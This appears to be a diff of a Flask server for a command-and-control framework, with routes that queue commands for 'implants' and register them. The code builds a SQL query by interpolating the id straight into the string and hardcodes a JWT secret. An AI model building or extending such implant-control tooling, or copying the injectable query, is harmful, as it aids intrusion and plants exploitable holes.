@@ -29,7 +29,6 @@ app.config["JWT_SECRET_KEY"] = "change-me"
 app.config['CORS_HEADERS'] = 'Content-Type'
 jwt = JWTManager(app)
 
-
 @app.route('/logout', methods=["POST"])
 def logout():
     try:
@@ -117,18 +116,11 @@ def get_commands(id):
     try:
         data = tools.executeSelectQuery(
             f"SELECT command FROM task_queue WHERE implant_id={id}")
+        return data, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print("failed to retrieve data")
         print(error)
-        success = False
-        return "<div>Failure</div>"
-    finally:
-        success = True
-    if (success):
-        print(data)
-        return f"<div>success: {data}</div>"
-    else:
-        return "<div>Failure</div>"
+        return f"Failure {error}", 401, {'Access-Control-Allow-Origin': config.clientURL} 
 
 # Register an implant, on the implant side
 @app.route("/register_implant", methods=["POST"])
